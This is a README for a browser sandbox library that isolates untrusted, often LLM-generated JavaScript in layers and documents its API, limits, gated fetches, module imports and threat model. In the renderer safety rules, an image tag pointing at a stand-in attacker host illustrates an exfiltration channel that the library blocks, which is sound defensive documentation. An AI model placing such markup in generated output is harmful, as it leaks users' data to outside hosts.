# icecream-sandbox

Run untrusted JavaScript in the browser, isolated in layers:

```
host page
  → <iframe sandbox="allow-scripts">            (opaque origin, no DOM/storage access)
    → Web Worker from a Blob URL             (no network fetch to start)
      → QuickJS compiled to WebAssembly      (guest code runs here)
```

Guest code gets exactly one global, `host`, with `host.send(string)`,
`host.ask(name, arg?)`, the gated `host.fetchText(url)`, and
`host.importModule(name)` — plus whatever transparent globals the host
configures (see [Communication](#communication-host--guest)).
Everything else — network, DOM, storage, timers, Node APIs — is absent
from the guest environment, and the layers around it would block
network access even if a guest somehow reached a real `fetch`.

No telemetry. Two runtime dependencies, both pinned:
`quickjs-emscripten-core@0.32.0` and
`@jitl/quickjs-singlefile-cjs-release-sync@0.32.0` (the singlefile
variant embeds its WASM as base64, so nothing is fetched at runtime).

## Install

```sh
npm install icecream-sandbox
```

Then serve `dist/iframe.html` from your own origin (see
[Serving the iframe document](#serving-the-iframe-document)) and:

```ts
import { Sandbox } from "icecream-sandbox";
const sandbox = await Sandbox.create({ iframeUrl: "/iframe.html" });
```

## Capabilities

- **Sandboxed JavaScript execution.** Guest code runs in QuickJS
  (WebAssembly) inside a Web Worker inside a sandboxed iframe — three
  layers between guest code and the host page. Each run gets a fresh
  runtime and context, discarded when the run settles.
- **One-shot runs and long-lived apps.** `run()` executes code to a
  string result; a guest that returns a never-settling promise stays
  alive across host messages, so one sandbox can host a persistent
  guest app.
- **Bidirectional messaging.** Host to guest with `send()` (received
  by the guest's `onMessage`); guest to host with `host.send()`.
  Everything crossing a boundary is a JSON string — never an object,
  handle, or function.
- **Host function allowlist.** `registerAsk` exposes named host
  functions to `host.ask()`; unregistered names reject inside the
  guest. The guest reaches exactly what you register, nothing else.
- **Transparent host bridging for generated code.** The host
  declares plain globals the guest may call like normal APIs —
  `alert("hi")`, `localStorage.setItem("k", "v")` — each call
  forwarded to the host's implementation. LLM-generated guest code
  needs no sandbox vocabulary. See
  [Communication](#communication-host--guest).
- **Host-to-guest function calls.** `sandbox.invoke("a.b.c", arg)`
  calls a guest function by dotted path, gated by a host-defined
  allowlist. See [Communication](#communication-host--guest).
- **Human-in-the-loop gated connections.** `host.fetchText()` lets a
  guest app fetch outside data (a stylesheet from a CDN, for example)
  only after the host approves: a developer allowlist, per-origin
  session grants, or your approval callback. GET only, credentials
  omitted, redirects rejected, response size-capped. See
  [Gated connections](#gated-connections-human-in-the-loop).
- **Guest ES module imports.** Guest code may `import` real packages:
  the host's import map points a bare specifier at a pinned URL, the
  sandbox downloads it through the same connection gate (one approval
  per origin), and caches it — a second import downloads nothing and
  prompts nobody. See
  [Guest ES module imports](#guest-es-module-imports).
- **Guest UI rendering (JSX / React components).** Guest components
  describe UI as element-tree data; the host renders it with real DOM
  inside a shadow root, with sanitized CSS and event round-trips. See
  [Rendering guest UI](#rendering-guest-ui-jsx--react-components).
- **Hard limits, enforced on both sides.** Deadline interrupt,
  memory and stack caps, message/output/code size caps, outstanding
  call caps, and a host watchdog (1.5× deadline) that kills hung
  workers and rebuilds the session. See
  [Limits](#limits-all-configurable-safe-defaults).
- **Fail-closed protocol.** Every port message is shape-checked
  before use; malformed, oversized, or wrong-source messages are
  ignored, never acted on. A failed session is never reused.
- **A dedicated security suite.** `npm run test:security` runs
  attack-focused tests (unit + browser) that try to break out, steal
  grants, smuggle markup, or bypass the gate — and prove each attempt
  fails. See [docs/threats-and-tests.md](docs/threats-and-tests.md).
- **Full documentation.** [docs/design.md](docs/design.md) shows how
  every flow works, with a diagram for each;
  [docs/use-cases.md](docs/use-cases.md) covers the use cases;
  [docs/threats-and-tests.md](docs/threats-and-tests.md) maps every
  threat to its prevention and its test.

## Quick start

```ts
import { Sandbox } from "icecream-sandbox";

// 1. Serve dist/iframe.html from your server with the headers below.
const sandbox = await Sandbox.create({ iframeUrl: "/iframe.html" });

sandbox.on("message", (m) => console.log("guest:", m));
sandbox.registerAsk("upper", (arg) => arg.toUpperCase());

const result = await sandbox.run(`
  host.send("hello from the guest");
  (async () => {
    const shouted = await host.ask("upper", "hello");
    host.send(shouted);
    return "done";
  })()
`);
console.log(result); // "done"

sandbox.dispose();
```

Guest code is a **classic script**: there is no top-level `await`.
Async guests wrap their body in an async IIFE, as above; the runner
awaits the returned promise.

## Communication (host ↔ guest)

Every way the two sides talk, in one place. The rule behind all of
them: **the trusted host defines the entire interface.** The guest
can never invent a capability the host did not configure, and
anything unconfigured fails closed.

### Guest → host

**1. Transparent bridged globals (for generated code).** Guest code
is often LLM-written: it calls plain APIs — `alert("hi")`,
`localStorage.setItem("k", "v")` — and cannot know about any
sandbox-specific `host.` object. So the host declares the guest's
vocabulary up front, in `Sandbox.create`:

```ts
const sandbox = await Sandbox.create({
  iframeUrl: "/iframe.html",
  globals: {
    alert: (message) => showToast(message),
    localStorage: {
      getItem: (k) => store[k] ?? null,
      setItem: (k, v) => { store[k] = String(v); },
      removeItem: (k) => { delete store[k]; },
    },
  },
});
```

```js
// Guest: plain code, no sandbox vocabulary.
await alert("saved");
await localStorage.setItem("theme", "dark");
const theme = await localStorage.getItem("theme"); // "dark"
```

The worker installs each configured name in the guest realm; every
call crosses to the host, which runs its implementation and returns
the result. A name the host did not configure simply does not exist
down there (`ReferenceError`). Rules:

- Arguments and return values are **JSON** — anything else fails
  loudly in the guest.
- Calls are **async by physics** (they cross the worker boundary):
  the guest always gets a promise back, so generated code must
  `await` them. A host function returning `undefined` resolves the
  guest's await with `null`.
- The config is validated at `create` time — a bad mapping fails
  before any guest code runs, never mid-run.

**2. `host.send(string)` → `sandbox.on("message")`.** Fire-and-forget
guest→host messages: UI trees, events, logs. Strings only.

**3. `host.ask(name, arg?)` → `sandbox.registerAsk(name, handler)`.**
Named host functions for hand-written guest code. `registerAsk` is
an explicit allowlist; unregistered names reject in the guest.
Handlers take one string and return one string (or a promise of
one). The bridged globals above are the transparent counterpart
for generated code; `ask` stays for code you write yourself.

**4. `host.fetchText(url)`.** A gated host-side fetch (GET only,
credentials omitted, redirects rejected, size-capped): developer
allowlist → per-origin session grants → your approval callback.
Absent a grant, it fails closed. See
[Gated connections](#gated-connections-human-in-the-loop).

**5. `host.importModule(name)`.** Gated, cached dynamic import of a
real package through the same gate. See
[Guest ES module imports](#guest-es-module-imports).

### Host → guest

**1. `sandbox.send(message)` → guest's `onMessage`.** Delivers a
string to the in-flight run's `globalThis.onMessage(message)`.
No-op when no run is in flight.

**2. `sandbox.invoke("a.b.c", arg)` — calling guest functions.** The
host calls a guest function by dotted path: top-level functions and
methods on guest objects alike.

```ts
const sandbox = await Sandbox.create({
  iframeUrl: "/iframe.html",
  guestFunctions: ["renderCard", "widgets.counter"], // the allowlist
});
await sandbox.run(`... guest defines renderCard, widgets ...`);
const html = await sandbox.invoke("renderCard", JSON.stringify(rows));
```

```js
// Guest: just normal globals. No registration call needed.
function renderCard(arg) { return buildCard(JSON.parse(arg)); }
globalThis.widgets = {
  count: 0,
  counter(n) { this.count += 1; return "count=" + this.count + ":" + n; },
};
```

Rules:

- Only paths in the create-time `guestFunctions` allowlist resolve;
  anything else rejects. The guest cannot expand the list.
- The path resolves through **own properties only** — never the
  prototype chain, so `constructor` / `__proto__` traversal cannot
  resolve.
- The final value must be a function; it is called with its parent
  object as `this`, receives **one string argument**, and must
  return a **string** (sync or async — an async one is bounded by
  the in-flight run's deadline like everything else).
- Only properties of `globalThis` are reachable: top-level
  `function` declarations in classic scripts qualify automatically;
  `const`/`let` bindings and module-scope declarations do not —
  assign what the host may call to `globalThis`.
- Invoking with no run in flight rejects; if the run ends first,
  the promise rejects.

### The LLM prompt contract

When the guest is LLM-generated, the system prompt lists the
available globals (`alert()`, `localStorage.*`, … — all async, await
them) and the invokable entry points the host will call. Generate
that list from the same `globals` / `guestFunctions` config so the
prompt and the sandbox can never disagree.

### Serving the iframe document

Serve `dist/iframe.html` with this CSP header (plus the
`allow-scripts`-only sandbox attribute on the `<iframe>` element —
**never** add `allow-same-origin`):

```
default-src 'none';
script-src 'wasm-unsafe-eval' 'unsafe-inline';
worker-src blob:;
connect-src 'none';
form-action 'none';
base-uri 'none';
frame-ancestors <your host origin>
```

And a restrictive `Permissions-Policy` denying everything the iframe
could never need (`camera=(), microphone=(), geolocation=(), ...`).
The demo server (`demo/demo-server.mjs`) shows the exact headers.

## API

### `Sandbox.create(options)`

| Option | Default | Meaning |
| --- | --- | --- |
| `iframeUrl` | (required) | URL of the served `dist/iframe.html`. |
| `document` | global `document` | Document to create the iframe in. |
| `defaultLimits` | see below | Limits applied to every run unless overridden. |
| `maxInboundBytes` | max(64 KiB, maxCodeSize) | Backstop on any single inbound port message. 1 MiB with defaults. |
| `handshakeTimeoutMs` | 10000 | Time to wait for iframe load + worker ready. |
| `allowedOrigins` | (none) | Origins the app pre-approves for guest connections, e.g. `["https://cdn.jsdelivr.net"]`. Held host-side; the guest can neither read nor change this list. |
| `onConnectionRequest` | (none) | Human-in-the-loop approval callback for guest connection requests (see below). Absent means deny. |
| `maxConnectionResponseBytes` | 1 MiB | Max response body bytes returned to the guest per connection. A response must also fit `maxInboundBytes` to cross the port. |
| `connectionTimeoutMs` | 10000 | Per-connection timeout. |
| `globals` | (none) | Transparent globals the guest may call like normal APIs — e.g. `{ alert: fn, localStorage: { getItem: fn, setItem: fn } }`. Each call crosses to the host's implementation; unconfigured names do not exist in the guest realm. See [Communication](#communication-host--guest). |
| `guestFunctions` | (none) | Allowlist of guest globals the host may call with `sandbox.invoke("a.b.c", arg)` — dotted paths. The guest defines them normally; it cannot expand this list. See [Communication](#communication-host--guest). |

### `sandbox.run(code, limits?, imports?)`

Runs guest code in a **fresh** QuickJS runtime and context, and resolves
with the guest's string result. A non-string result is rejected. After
any limit error, the runtime is discarded, never reused.

When the code uses static `import` statements, `imports` is the import
map (bare specifier → absolute module URL, pinned version), and the run
evaluates as a real QuickJS module. A module run's job is its side
effects (`host.send`, event handlers): a module that finishes
synchronously resolves to `""`, and a top-level await that never
settles keeps the run alive for events exactly like a classic
long-lived app. See
[Guest ES module imports](#guest-es-module-imports).

### `sandbox.send(message)`

Delivers a string to the guest. A guest that defines
`globalThis.onMessage = (m) => { ... }` receives it. Non-strings throw
synchronously.

### `sandbox.invoke(name, arg?)`

Calls a guest function by dotted path — host → guest. Only paths in
the create-time `guestFunctions` allowlist resolve; the path walks
own properties only; the final value must be a function, called with
its parent as `this`, receiving one string and returning a string.
Rejects when no run is in flight or the run ends first. See
[Communication](#communication-host--guest).

### `sandbox.on("message" | "error", handler)`

`"message"` fires for `host.send` from the guest; `"error"` fires for
guest errors.

### `sandbox.registerAsk(name, handler)`

Registers one host function the guest may call via
`host.ask(name, arg?)`. The name is an explicit allowlist: an
unregistered name rejects inside the guest. Handlers must return a
string (or a promise of one); anything else is reported as an error.

### `sandbox.getConnectionGrants()` / `revokeConnectionGrant(origin)` / `clearConnectionGrants()`

Inspect and revoke the per-origin session grants the user approved (see
"Gated connections"). Grants live in memory on the host and die on
`dispose()`.

### Guest: `host.fetchText(url)`

The guest's only network request — and it is a *request*, not a
capability. The host's connection gate decides (allowlist, session
grant, or your approval callback) and performs a GET itself; the guest
receives only the body text. Absolute `http(s)` URLs only. See "Gated
connections" for the full rules.

### `sandbox.dispose()`

Terminates the worker, closes the port, removes the iframe.

## Limits (all configurable, safe defaults)

| Limit | Default | Enforcement |
| --- | --- | --- |
| `deadlineMs` | 1000 | QuickJS interrupt handler stops the run. |
| `memoryLimitBytes` | 16 MiB | `setMemoryLimit`. See the string-payload note below. |
| `maxStackSize` | 256 KiB | `setMaxStackSize`. Values above 256 KiB are **rejected, never clamped** — 512 KiB and up crashed the host in testing. |
| `maxMessageSize` | 64 KiB | Any single message over this is rejected. |
| `maxCodeSize` | 1 MiB | Guest source over this is rejected before running. |
| `maxOutstandingAsks` | 8 | The 9th concurrent ask throws inside the guest. |
| `maxOutstandingFetches` | 4 | The 5th concurrent `host.fetchText` throws inside the guest. |
| `maxTotalOutputBytes` | 1 MiB | Total `host.send` bytes per run. |
| `maxImportModules` | 64 | Modules fetched for one run's import graph (entry + transitive). |
| `maxImportDepth` | 16 | Import depth; entry imports are depth 0. |
| watchdog | 1.5 × deadline | The host kills the session if no result arrives; the next run rebuilds a fresh session (new worker, new handshake). |

Messages between host, iframe, and worker are **JSON strings only** —
never objects, handles, or functions. Every guest argument is
type-checked with `vm.typeof` before it is read. The iframe's origin is
`"null"`, so the handshake is verified by `event.source` plus a random
nonce, never by origin. All QuickJS handles are disposed through
`Scope`; a run's runtime is never reused after an out-of-memory error.

### Known limit behavior: string payloads

Measured on quickjs-emscripten 0.32.0: `setMemoryLimit` stops object
and array accumulation fast, but it does **not** charge string payload
bytes — a guest appending 10 KiB strings can grow past a 2 MiB limit
until the WASM heap or the deadline stops it. The deadline interrupt
and the host watchdog are therefore the backstop for string bombs, not
the memory limit. Keep deadlines short, and treat `memoryLimitBytes`
as a cap on object-graph size, not on total guest RAM. This is covered
by a unit test (`string bomb is stopped by the deadline`) and the
browser suite's watchdog test.

## Gated connections (human-in-the-loop)

The guest has no network — but sometimes a guest app legitimately
needs something from outside, like a stylesheet from a CDN. That goes
through the connection gate, never around it:

1. The guest calls `host.fetchText(url)` (absolute `http(s)` only).
2. The host checks two lists it holds itself: `allowedOrigins`
   (origins the app pre-approves) and the user's per-origin session
   grants. The guest can neither read nor change either list.
3. If neither covers the origin, the host calls your
   `onConnectionRequest` callback — your approval UI, running in the
   **host page**, never inside the sandbox where the guest could fake
   it. It answers `"allow-once"`, `"allow-session"` (grants the origin
   until `dispose()`), or `"deny"`. No callback means deny.
4. Only then does the **host** fetch: GET only, credentials omitted
   (the guest can never ride the host's login), redirects rejected
   outright (never followed — in browsers a redirect's destination is
   invisible behind an opaque-redirect response, so following one
   would let an approved origin bounce the request to an unapproved
   one; request the final URL directly), response body size-capped
   and returned as text. Headers and cookies are never returned.

Grants survive worker rebuilds (a watchdog kill must not re-prompt for
an origin the user already approved) and die on `dispose()`. Manage
them with `getConnectionGrants()`, `revokeConnectionGrant(origin)`,
and `clearConnectionGrants()`. Cross-origin fetches still need the
target to allow CORS (a CDN that serves with `Access-Control-Allow-Origin:
*`, like jsDelivr, works; one that doesn't will fail at the browser).

Example — a guest app fetching CDN CSS, if the user allows it:

```js
const css = await host.fetchText("https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.css");
host.send(JSON.stringify({ kind: "render", tree: /* ... */, css }));
```

## Guest ES module imports

Guest code may use static `import` statements — including real
packages, not just relative files — and dynamic imports too. There
is no install step: the host app declares an import map, and the
sandbox does the rest.

```js
const sandbox = await Sandbox.create({ iframeUrl: "/sandbox/iframe.html" });
await sandbox.run(
  `import { format } from 'd3-format';
   host.send(format('.2f')(3.14159));`,
  { deadlineMs: 10000 },
  { "d3-format": "https://cdn.jsdelivr.net/npm/d3-format@3.1.2/+esm" },
);
```

How it works:

- **The import map is host-owned.** Bare specifiers (`'d3-format'`)
  resolve through the map; an unmapped specifier fails the run naming
  the specifier. The guest can neither read nor change the map.
- **Downloads go through the connection gate.** The first download
  from an origin needs the usual approval (developer allowlist, a
  session grant, or your approval callback); every transitive hop is
  gated on its own origin, so a module cannot smuggle in a second
  origin under the first one's grant. Redirects are rejected, fetches
  are GET-only with credentials omitted, and bodies are size-capped.
- **Downloads are cached.** The host keeps downloaded sources keyed
  by resolved URL, across runs and across watchdog session rebuilds,
  until `dispose()` or `clearImportCache()`. A second import of the
  same URL downloads nothing and prompts nobody — that is the
  one-time-approval behavior, not a second grant.
- **Evaluation uses real module semantics.** The worker pre-fetches
  the whole static import graph before evaluating anything (QuickJS's
  module loader is synchronous and cannot await a fetch), then loads
  from the pre-fetched map with real imports/exports — no source
  rewriting. Relative imports resolve against the importing module's
  URL, so a fetched module can import its own siblings. The entry
  module has no URL, so relative imports in guest entry code are an
  error — map entry imports instead.
- **Imported code gains nothing.** It runs inside the same guest
  realm, under the same limits, with the same single `host` global.
  Its network still goes through the gate; it has no DOM, storage,
  or host objects.
- **Pin your versions.** The map points at exact versions for a
  reason: a floating specifier is supply-chain drift. The library
  does not re-resolve or update anything on its own.

### Dynamic imports

There are two dynamic paths, and they differ only in when the name
is known:

- **Literal `import('d3-format')`.** The specifier is visible in the
  code, so the sandbox pre-fetches it with the rest of the import
  graph and the module evaluates lazily when `import()` runs. The
  guest then re-renders with it, exactly like a lazy import in a
  browser — the download happened up front, the evaluation did not.
- **Computed `import(name)`.** A variable holding the name cannot be
  known ahead of time, so it cannot be pre-fetched. For those, the
  guest calls `host.importModule(name)` instead: it downloads through
  the same gate and cache **at call time** and resolves with the
  module's namespace, so the guest re-renders with it. A computed
  `import()` of a module that was never downloaded fails naming the
  module — that is the signal to use `host.importModule`.

One rule covers both paths: `host.importModule` accepts only names
in the import map. The app decides which packages exist; the guest
only picks among them, whether by literal import or by name.

Limits: a module source must fit `maxInboundBytes` to cross the port
(default 1 MiB, same as the gate's response cap).

See `examples/import-package.html` for a working guest app that
imports the real d3-format package, `examples/dynamic-import.html`
for lazy loading on click plus the `import()` version running from
cache, and `docs/design.md` for the resolution diagram.

## Rendering guest UI (JSX / React components)

The guest cannot touch the DOM — that is the point of the sandbox —
but a guest app can still render visibly, because it describes its UI
as data and the **host** renders it:

1. Guest code builds an element tree (plain JSON) and sends it with
   `host.send`. Components may be authored as JSX and compiled by the
   **app's own toolchain** into createElement-style calls before
   `run()`; the library ships no JSX compiler, keeping the worker
   bundle small. A tree node is `{ type, props?, children? }`.
2. The app calls `renderGuestTree(container, tree, { cssText, onEvent })`.
   The tree renders inside a **shadow root** on the container, so
   guest styles cannot leak into the host page and host styles cannot
   leak in. Stylesheet text (e.g. CDN CSS fetched through the gate)
   is sanitized first: comments stripped, `@import` removed, `url()`
   replaced with `none` — guest CSS can never fetch anything.
3. Events round-trip: `onClick: "inc"` becomes a host listener that
   calls `onEvent("inc")`; the app forwards that to the guest with
   `sandbox.send(...)`; the guest recomputes and sends a new tree
   (full re-render per event).

A long-lived guest app keeps one run in flight — its code ends with a
promise that settles only when the app ends — so `onMessage` keeps
working across events. See the demo's counter app.

Renderer safety rules (enforced in `render.ts`, not hoped for):

- No `innerHTML` anywhere: text children become text nodes, so a
  guest string can never become markup.
- A tag allowlist: no `script`, `iframe`, `object`, `embed`, `link`,
  `meta`, `base`, `form`, or `style` elements from the guest.
- No remote media: an `<img>` `src` must be a `data:` URL. A remote
  `src` would make the host page fetch a guest-chosen URL with no
  gate approval — an exfiltration channel
  (`<img src="https://evil.example/?x=...">`). Remote images belong
  behind `host.fetchText`; binary fetch is a follow-up (v1 returns
  text).
- Links: `href` must be `http(s)`; `javascript:` is dropped, and
  `_blank` links get `rel="noopener"`. A link with an `onClick` id does
  not navigate on click — the click is reported as an event so the host
  decides (a gated link: approve and open, or ignore). A link with no
  event id navigates normally.
- Trees are capped (depth 32, 5000 nodes) before any DOM is built.

## Threat model

### What it defends against

- **Guest code reaching the network.** The guest environment has no
  `fetch`, `XMLHttpRequest`, or `WebSocket`. The worker's CSP sets
  `connect-src 'none'`, so even worker-scope network attempts are
  blocked before any request leaves. The browser suite proves this
  with a local canary server that records zero requests. The only
  network path is the connection gate: host-side, permission-checked,
  and only after allowlist, session grant, or explicit user approval.
- **Guest code reaching the DOM.** The guest runs in QuickJS, not in
  the page's JS engine. There is no `document`, `window`, or element
  access, and the iframe cannot touch the host DOM (opaque origin,
  `allow-scripts` only).
- **Guest code reaching storage.** No `localStorage`, `indexedDB`,
  cookies, or cache APIs exist in the guest, and the sandboxed iframe
  has no storage of its own.
- **Guest code reaching the host.** The only bridge is the
  `host.send` / `host.ask` pair over a `MessageChannel` port, carrying
  JSON strings. The host exposes exactly the ask handlers it
  registers. Messages from any other source, or with a wrong nonce,
  are ignored by the iframe.
- **Runaway guests.** Deadline interrupt, memory limit, stack limit,
  message/output caps, and the host watchdog bound CPU, memory, and
  chatter. A killed or errored run is discarded, never resumed.

### What it does NOT defend against

- **Side channels.** Timing, memory-usage, and other side channels
  between guest code and the host are out of scope.
- **Misuse of host functions.** If you register an ask handler that
  fetches a URL, reads a file, or touches the DOM, the guest can make
  it do that. The allowlist is yours to keep narrow. The gated
  `host.fetchText` is the one network path the core provides, and it
  is deny-by-default: without `allowedOrigins`, a session grant, or
  your approval callback answering yes, it fetches nothing.
- **Approval-UI spoofing.** The approval callback must run in the
  host page's trusted UI. If you render the prompt inside the sandbox
  (or anywhere the guest can influence), the guest can fake a "yes".
- **CSS parser gaps.** `sanitizeCss` is deliberately conservative
  string filtering, not a full CSS parser. It removes the known fetch
  vectors (`@import`, `url()`); exotic CSS syntax that a future
  browser interprets as a fetch is outside what string filtering can
  guarantee. If you need richer stylesheets, a real CSS parser is the
  follow-up.
- **Main-thread denial of service.** The guest runs off the main
  thread, but a flood of runs, oversized code, or rapid sandbox
  creation is still host work. Rate-limit `run()` at your layer if
  guests are untrusted at that level.
- **Engine bugs.** A vulnerability in QuickJS itself, in the WASM
  runtime, or in the browser's sandbox implementation is outside what
  this library can fix. Keep dependencies pinned and updated.

## Browser support

Verified 2026-10-28 with the Playwright suite in this repo
(`npm run test:browser`):

- **Chromium: 29/29 pass** — blob worker in the opaque-origin iframe,
  globals probe, canary zero-request, wrong-source ignored, watchdog
  kill + rebuild, plus gated connections (pre-allowed, deny-by-default,
  allow-once/session, revoke, redirect rejection, oversized body,
  guest cannot read the allowlist), guest rendering (counter
  round-trip, gated links, CDN CSS sanitization + styling), and the
  12-test security suite (escape attempts, render attacks, gate
  attacks).
- **Firefox: 29/29 pass** — same suite.
- **WebKit: not verified in this environment.** The WebKit binary is
  installed but cannot launch here: the VM lacks its system libraries
  and `apt` is held by the runtime's own package replay, so the
  dependencies cannot be installed right now. CI runs WebKit on
  GitHub runners, where the dependencies install normally.

If a target browser ever fails the blob-worker-in-opaque-iframe test,
do **not** weaken the sandbox to work around it. The supported
fallback is a dedicated cross-site sandbox origin: serve
`dist/iframe.html` from an origin that is cross-site to the host page
(e.g. `sandbox.example.com` while the app lives on `example.com`),
which restores origin isolation even where opaque-origin blob workers
are unavailable.

## Examples

- `examples/population-chart.html` — a guest component that charts
  world population from 1920 to now: clickable bars, a
  population/growth toggle, and source links whose clicks need your
  approval before the host opens them. Run `npm run demo`, then open
  `/examples/population-chart.html`. A screenshot of it is in
  `examples/population-chart.png`.
- `examples/import-package.html` — a guest ES module that imports the
  real d3-format package: approve the download once, format numbers
  with the imported function, then press Re-run and watch the same
  import come from the cache with no new prompt and no new download.
  Run `npm run demo`, then open `/examples/import-package.html`. A
  screenshot of it is in `examples/import-package.png`.
- `examples/dynamic-import.html` — a guest app that starts with
  nothing downloaded: press Load formatter and the guest imports
  d3-format by name at that moment (one approval, then a re-render),
  then press Try the import() version and watch the same app restart
  as a module rendering from the cache. Run `npm run demo`, then open
  `/examples/dynamic-import.html`. A screenshot of it is in
  `examples/dynamic-import.png`.
- `examples/static-dynamic-imports.html` — one guest app, two real
  chart libraries, two import styles: Chart.js 4.6.1 via a static
  import (with its transitive `@kurkle/color` dependency) and
  Chartist 1.3.1 via a dynamic `host.importModule` on button click.
  The guest builds both charts with the real libraries (a Chart.js
  config, a Chartist-normalized series) and the host paints the SVG.
  Run `npm run demo`, then open
  `/examples/static-dynamic-imports.html`. A screenshot of it is in
  `examples/static-dynamic-imports.png`.

## Development

```sh
npm run build        # typecheck + emit dist/ + bundle worker + iframe.html
npm run typecheck
npm test             # Vitest unit tests (Node, no browser needed)
npm run test:browser # Playwright: Chromium, Firefox, WebKit
npm run demo         # demo page at http://localhost:8901/
```

The demo server serves the iframe document with the exact CSP and
`Permissions-Policy` from this README, with `frame-ancestors` set
dynamically from the request's Host header.

## License

PolyForm Noncommercial 1.0.0 — see [LICENSE](LICENSE). Free for any
noncommercial use (personal, hobby, study, research, charities, schools,
government). Any commercial use requires a separate commercial license
from the licensor — contact via https://deb0.com.
